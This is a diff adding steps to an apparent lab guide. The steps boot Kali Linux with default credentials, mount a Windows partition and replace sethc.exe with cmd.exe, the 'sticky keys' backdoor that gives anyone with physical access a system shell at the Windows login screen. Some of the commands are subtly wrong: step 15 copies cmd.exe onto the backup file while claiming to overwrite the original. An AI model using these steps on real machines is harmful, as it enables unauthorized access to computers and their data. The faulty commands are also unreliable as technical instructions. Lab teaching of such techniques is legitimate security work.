@@ -78,3 +78,10 @@ get test.txt
 7. Login with username `root` and password `toor` (or username `kali` and password `kali`)
 8. Type `fdisk -l` to view the Windows partition
 9. Windows partition may be listed as `/dev/sda2`
+10. Type `mkdir /mnt/sda2` to create a mount point
+11. Type `mount /dev/sda2/ /mnt/sda2` to mount the Windows partition
+12. Type `ls /mnt/sda2` to list contents of the Windows partition
+13. Type `cd /mnt/sda2/Windows/System32`
+14. Type `cp sethc.exe sethc.exe.bak` to make a copy of the `sethc.exe` file
+15. Type `cp cmd.exe sethc.exe.bak` to overwrite the original file with the Command Prompt executable
+16. Type `init 0`
